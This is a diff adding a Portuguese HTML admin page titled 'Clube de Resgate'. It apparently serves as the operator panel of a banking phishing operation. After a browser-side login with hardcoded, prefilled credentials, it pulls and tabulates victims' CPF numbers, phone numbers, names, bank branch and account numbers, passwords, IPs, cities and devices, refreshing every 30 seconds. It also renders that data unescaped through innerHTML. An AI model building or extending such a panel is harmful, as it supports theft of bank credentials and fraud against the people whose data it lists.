@@ -1,0 +1,560 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Painel - Clube de Resgate</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            background-color: #0a0a0a;
+            color: #fff;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1300px;
+            margin: 0 auto;
+        }
+
+        /* ===== LOGIN ===== */
+        .login-box {
+            max-width: 400px;
+            margin: 100px auto;
+            background: #111;
+            padding: 40px 30px;
+            border-radius: 16px;
+            border: 1px solid #222;
+            text-align: center;
+        }
+
+        .login-box h1 {
+            font-size: 24px;
+            margin-bottom: 8px;
+        }
+
+        .login-box p {
+            color: #888;
+            font-size: 14px;
+            margin-bottom: 25px;
+        }
+
+        .login-box input {
+            width: 100%;
+            padding: 14px 16px;
+            margin-bottom: 12px;
+            border: 2px solid #222;
+            border-radius: 10px;
+            background: #000;
+            color: #fff;
+            font-size: 16px;
+            outline: none;
+        }
+
+        .login-box input:focus {
+            border-color: #ff0000;
+        }
+
+        .login-box .btn {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 10px;
+            background: #ff0000;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.3s;
+            margin-top: 10px;
+        }
+
+        .login-box .btn:hover {
+            background: #cc0000;
+        }
+
+        .login-box .erro {
+            color: #ff0000;
+            font-size: 14px;
+            margin-top: 12px;
+            display: none;
+        }
+
+        /* ===== PAINEL (logado) ===== */
+        .painel-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 0;
+            border-bottom: 1px solid #222;
+            margin-bottom: 25px;
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+
+        .painel-header h1 {
+            font-size: 22px;
+        }
+
+        .painel-header h1 span {
+            color: #ff0000;
+        }
+
+        .painel-header .info {
+            color: #888;
+            font-size: 14px;
+        }
+
+        .painel-header .btn-sair {
+            padding: 10px 24px;
+            border: 2px solid #ff0000;
+            border-radius: 8px;
+            background: transparent;
+            color: #ff0000;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        .painel-header .btn-sair:hover {
+            background: #ff0000;
+            color: #fff;
+        }
+
+        /* ===== ESTATÍSTICAS ===== */
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin-bottom: 25px;
+        }
+
+        .stat-card {
+            background: #111;
+            padding: 18px 20px;
+            border-radius: 12px;
+            border: 1px solid #1a1a1a;
+        }
+
+        .stat-card .numero {
+            font-size: 28px;
+            font-weight: 900;
+            color: #ff0000;
+        }
+
+        .stat-card .label {
+            font-size: 13px;
+            color: #888;
+            margin-top: 4px;
+        }
+
+        /* ===== TABELA ===== */
+        .tabela-wrapper {
+            background: #111;
+            border-radius: 12px;
+            border: 1px solid #1a1a1a;
+            overflow-x: auto;
+            padding: 0 0 10px 0;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 13px;
+            min-width: 1000px;
+        }
+
+        thead {
+            background: #1a1a1a;
+        }
+
+        th {
+            padding: 14px 12px;
+            text-align: left;
+            color: #888;
+            font-weight: 600;
+            text-transform: uppercase;
+            font-size: 11px;
+            letter-spacing: 0.5px;
+            border-bottom: 2px solid #222;
+            position: sticky;
+            top: 0;
+            background: #1a1a1a;
+        }
+
+        td {
+            padding: 12px;
+            border-bottom: 1px solid #1a1a1a;
+            color: #ddd;
+            word-break: break-word;
+        }
+
+        tr:hover td {
+            background: #161616;
+        }
+
+        .badge {
+            display: inline-block;
+            padding: 3px 10px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 600;
+        }
+
+        .badge-iphone {
+            background: #1a1a3a;
+            color: #6a8cff;
+        }
+        .badge-android {
+            background: #1a2a1a;
+            color: #6aff6a;
+        }
+        .badge-pc {
+            background: #2a2a2a;
+            color: #aaa;
+        }
+        .badge-mac {
+            background: #2a1a2a;
+            color: #ff6aff;
+        }
+
+        .sem-dados {
+            text-align: center;
+            padding: 50px;
+            color: #666;
+            font-size: 16px;
+        }
+
+        /* ===== BUSCA ===== */
+        .busca {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+
+        .busca input {
+            flex: 1;
+            min-width: 200px;
+            padding: 12px 16px;
+            border: 2px solid #222;
+            border-radius: 10px;
+            background: #000;
+            color: #fff;
+            font-size: 14px;
+            outline: none;
+        }
+
+        .busca input:focus {
+            border-color: #ff0000;
+        }
+
+        /* ============================================================ */
+        /* RESPONSIVO */
+        /* ============================================================ */
+        @media (max-width: 768px) {
+            .painel-header {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+
+            .stats {
+                grid-template-columns: repeat(2, 1fr);
+            }
+
+            .stat-card .numero {
+                font-size: 22px;
+            }
+
+            table {
+                font-size: 12px;
+                min-width: 800px;
+            }
+
+            th,
+            td {
+                padding: 8px 10px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .login-box {
+                margin: 50px auto;
+                padding: 30px 20px;
+            }
+
+            .stats {
+                grid-template-columns: 1fr;
+            }
+
+            .busca input {
+                min-width: 150px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container" id="app">
+
+        <!-- ============================================================ -->
+        <!-- TELA DE LOGIN -->
+        <!-- ============================================================ -->
+        <div id="telaLogin">
+            <div class="login-box">
+                <h1>🔐 Painel</h1>
+                <p>Clube de Resgate</p>
+                <input type="text" id="loginUser" placeholder="Usuário" value="dg">
+                <input type="password" id="loginSenha" placeholder="Senha" value="dg2026">
+                <button class="btn" id="btnLogin">ENTRAR</button>
+                <div class="erro" id="erroLogin">Usuário ou senha incorretos.</div>
+            </div>
+        </div>
+
+        <!-- ============================================================ -->
+        <!-- PAINEL (LOGADO) -->
+        <!-- ============================================================ -->
+        <div id="telaPainel" style="display: none;">
+            <!-- Header -->
+            <div class="painel-header">
+                <div>
+                    <h1>📊 <span>Clube de Resgate</span></h1>
+                    <div class="info">Painel administrativo</div>
+                </div>
+                <button class="btn-sair" id="btnSair">SAIR</button>
+            </div>
+
+            <!-- Stats -->
+            <div class="stats" id="stats">
+                <div class="stat-card">
+                    <div class="numero" id="totalResgates">0</div>
+                    <div class="label">Total de Resgates</div>
+                </div>
+                <div class="stat-card">
+                    <div class="numero" id="totalHoje">0</div>
+                    <div class="label">Hoje</div>
+                </div>
+                <div class="stat-card">
+                    <div class="numero" id="totalDispositivos">0</div>
+                    <div class="label">Dispositivos diferentes</div>
+                </div>
+            </div>
+
+            <!-- Busca -->
+            <div class="busca">
+                <input type="text" id="buscaInput" placeholder="🔍 Buscar por CPF, Nome, Telefone..." oninput="filtrarTabela()">
+            </div>
+
+            <!-- Tabela -->
+            <div class="tabela-wrapper">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>#</th>
+                            <th>CPF</th>
+                            <th>Telefone</th>
+                            <th>Nome</th>
+                            <th>Agência</th>
+                            <th>Conta</th>
+                            <th>Senha</th>
+                            <th>IP</th>
+                            <th>Cidade</th>
+                            <th>Dispositivo</th>
+                            <th>Data/Hora</th>
+                        </tr>
+                    </thead>
+                    <tbody id="tabelaCorpo">
+                        <tr>
+                            <td colspan="11" class="sem-dados">Carregando dados...</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        // ================================================================
+        // VARIÁVEIS
+        // ================================================================
+        let dadosCache = [];
+        let logado = false;
+
+        // ================================================================
+        // LOGIN
+        // ================================================================
+        document.getElementById('btnLogin').addEventListener('click', function() {
+            const user = document.getElementById('loginUser').value.trim();
+            const senha = document.getElementById('loginSenha').value.trim();
+            const erroEl = document.getElementById('erroLogin');
+
+            if (user === 'dg' && senha === 'dg2026') {
+                erroEl.style.display = 'none';
+                logado = true;
+                document.getElementById('telaLogin').style.display = 'none';
+                document.getElementById('telaPainel').style.display = 'block';
+                carregarDados();
+            } else {
+                erroEl.style.display = 'block';
+            }
+        });
+
+        // Enter no login
+        document.getElementById('loginSenha').addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') document.getElementById('btnLogin').click();
+        });
+        document.getElementById('loginUser').addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') document.getElementById('btnLogin').click();
+        });
+
+        // ================================================================
+        // SAIR
+        // ================================================================
+        document.getElementById('btnSair').addEventListener('click', function() {
+            logado = false;
+            document.getElementById('telaLogin').style.display = 'block';
+            document.getElementById('telaPainel').style.display = 'none';
+            document.getElementById('loginSenha').value = '';
+        });
+
+        // ================================================================
+        // CARREGAR DADOS
+        // ================================================================
+        async function carregarDados() {
+            try {
+                const response = await fetch('/api/listar-resgates');
+                const data = await response.json();
+
+                if (data.sucesso && data.dados) {
+                    dadosCache = data.dados;
+                    atualizarStats();
+                    renderizarTabela(dadosCache);
+                } else {
+                    document.getElementById('tabelaCorpo').innerHTML = `
+                        <tr><td colspan="11" class="sem-dados">Nenhum resgate encontrado.</td></tr>
+                    `;
+                }
+            } catch (error) {
+                console.error('Erro ao carregar:', error);
+                document.getElementById('tabelaCorpo').innerHTML = `
+                    <tr><td colspan="11" class="sem-dados">Erro ao carregar dados.</td></tr>
+                `;
+            }
+        }
+
+        // ================================================================
+        // ATUALIZAR ESTATÍSTICAS
+        // ================================================================
+        function atualizarStats() {
+            const total = dadosCache.length;
+            document.getElementById('totalResgates').textContent = total;
+
+            // Hoje
+            const hoje = new Date().toLocaleDateString('pt-BR');
+            const hojeCount = dadosCache.filter(d => {
+                const data = new Date(d.data_hora);
+                return data.toLocaleDateString('pt-BR') === hoje;
+            }).length;
+            document.getElementById('totalHoje').textContent = hojeCount;
+
+            // Dispositivos únicos
+            const dispositivos = new Set(dadosCache.map(d => d.dispositivo));
+            document.getElementById('totalDispositivos').textContent = dispositivos.size;
+        }
+
+        // ================================================================
+        // RENDERIZAR TABELA
+        // ================================================================
+        function renderizarTabela(dados) {
+            const tbody = document.getElementById('tabelaCorpo');
+
+            if (!dados || dados.length === 0) {
+                tbody.innerHTML = `<tr><td colspan="11" class="sem-dados">Nenhum registro encontrado.</td></tr>`;
+                return;
+            }
+
+            let html = '';
+            dados.forEach((d, index) => {
+                const dispositivoClass = getDispositivoClass(d.dispositivo);
+                html += `
+                    <tr>
+                        <td>${index + 1}</td>
+                        <td>${d.cpf || '-'}</td>
+                        <td>${d.telefone || '-'}</td>
+                        <td><strong>${d.nome || '-'}</strong></td>
+                        <td>${d.agencia || '-'}</td>
+                        <td>${d.conta || '-'}</td>
+                        <td>${d.senha || '-'}</td>
+                        <td style="font-size:12px; color:#666;">${d.ip || '-'}</td>
+                        <td style="font-size:12px; color:#666;">${d.cidade || '-'}</td>
+                        <td><span class="badge ${dispositivoClass}">${d.dispositivo || 'Desconhecido'}</span></td>
+                        <td style="font-size:12px; color:#666;">${formatarData(d.data_hora)}</td>
+                    </tr>
+                `;
+            });
+
+            tbody.innerHTML = html;
+        }
+
+        // ================================================================
+        // FILTRAR TABELA
+        // ================================================================
+        function filtrarTabela() {
+            const busca = document.getElementById('buscaInput').value.toLowerCase().trim();
+
+            if (!busca) {
+                renderizarTabela(dadosCache);
+                return;
+            }
+
+            const filtrados = dadosCache.filter(d => {
+                return (d.cpf && d.cpf.includes(busca)) ||
+                    (d.nome && d.nome.toLowerCase().includes(busca)) ||
+                    (d.telefone && d.telefone.includes(busca)) ||
+                    (d.ip && d.ip.includes(busca));
+            });
+
+            renderizarTabela(filtrados);
+        }
+
+        // ================================================================
+        // FUNÇÕES AUXILIARES
+        // ================================================================
+        function getDispositivoClass(dispositivo) {
+            if (!dispositivo) return 'badge-pc';
+            if (dispositivo.includes('iPhone')) return 'badge-iphone';
+            if (dispositivo.includes('Android')) return 'badge-android';
+            if (dispositivo.includes('Mac')) return 'badge-mac';
+            return 'badge-pc';
+        }
+
+        function formatarData(data) {
+            if (!data) return '-';
+            const d = new Date(data);
+            return d.toLocaleString('pt-BR', {
+                day: '2-digit',
+                month: '2-digit',
+                year: 'numeric',
+                hour: '2-digit',
+                minute: '2-digit'
+            });
+        }
+
+        // ================================================================
+        // RECARREGAR A CADA 30 SEGUNDOS
+        // ================================================================
+        setInterval(() => {
+            if (logado) carregarDados();
+        }, 30000);
+    </script>
+
+</body>
+</html>
